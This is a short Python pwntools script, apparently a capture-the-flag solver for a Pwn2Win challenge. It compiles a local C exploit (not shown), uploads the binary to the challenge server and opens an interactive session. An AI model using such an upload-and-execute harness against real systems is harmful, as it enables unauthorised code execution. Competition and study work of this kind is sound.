#!/usr/bin/env python3
from pwn import *


def connect():
    return remote("baby-writeonly-password-manager.pwn2win.party", 1337)


def main():
    subprocess.check_call(
        ["gcc", "-o", "pwnit", "-fPIE", "-Os", "-Wall", "-Wextra", "-Werror", "pwnit.c"]
    )
    with open("pwnit", "rb") as elf_fp:
        elf = elf_fp.read()
    with connect() as tube:
        tube.sendlineafter("Give me how many bytes (max: 30000)\n", str(len(elf)))
        tube.sendafter("Send 'em!\n", elf)
        tube.interactive()


if __name__ == "__main__":
    main()
